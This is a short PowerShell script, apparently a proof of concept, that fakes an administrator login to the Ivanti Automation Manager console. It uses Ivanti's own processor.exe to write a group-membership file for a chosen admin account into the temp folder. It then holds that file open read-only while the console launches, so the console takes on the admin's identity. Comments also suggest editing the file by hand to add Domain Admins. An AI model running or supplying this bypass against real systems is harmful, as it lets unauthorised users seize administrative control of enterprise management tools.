Write-Host "Fake logged in user"

# fill in your domain
$domain = 'CONTOSO'

# use any username that has admin access, we will call the processor utility to
# create the text file with the groups that $adminUser is member of.
# This is just because it's the laziest way, we can also manually edit the file e.g.
# add Domain Admins group or Ivanti AM Admins AD group....
$adminUser = 'remko-adm'
$loginTxtPath = "$env:temp\login.txt"

# call Ivanti's own processor command but give it the Ivanti AM admin user as param to getusergroups
# but save the file in Local App Data
Start-Process -FilePath "c:\Program Files (x86)\Ivanti\Automation\Console\processor.exe" -ArgumentList "/getusergroups=$domain\$adminUser /processedPath=`"$loginTxtPath`"" -Wait
Write-Host "Launch Automation Manager Admin Console"

# Open the file with Share options only allowing read...
$f = [System.IO.File]::Open($loginTxtPath, 'Open', 'Read', 'Read')

# launch Ivanti AM console
Start-Process -FilePath 'c:\Program Files (x86)\Ivanti\Automation\Console\WMC.exe' 

# Wait a few seconds for the console to load then close the file handle
Start-Sleep -Seconds 5
Write-Host "Cleaning up..."
$f.Close()
